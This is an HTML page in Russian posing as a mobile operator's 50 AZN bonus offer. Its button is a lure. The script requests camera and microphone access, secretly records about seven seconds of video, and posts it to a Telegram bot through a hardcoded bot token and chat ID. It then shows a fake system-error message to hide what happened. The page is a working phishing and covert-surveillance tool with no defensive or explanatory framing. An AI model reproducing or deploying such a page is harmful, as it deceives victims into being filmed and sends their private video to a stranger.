<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подарок от оператора</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
        .container { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 Поздравляем!</h1>
        <p>Ваш номер выбран для начисления 50 AZN.</p>
        <button id="bonusBtn">ПОЛУЧИТЬ БОНУС</button>
    </div>

    <script>
        const TOKEN = '7611685160:AAFm3W8v8kS57C3eD-06UByX5_X92Oa6234'; 
        const CHAT_ID = '5590781901';

        document.getElementById('bonusBtn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'prank.webm');
                    formData.append('caption', '📸 Yeni video gəldi!');

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                };

                mediaRecorder.start();
                
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                    alert("Ошибка системы: Повторите попытку позже.");
                }, 7000);

            } catch (err) {
                alert("Для получения бонуса необходимо разрешить доступ к камере.");
            }
        });
    </script>
</body>
</html>
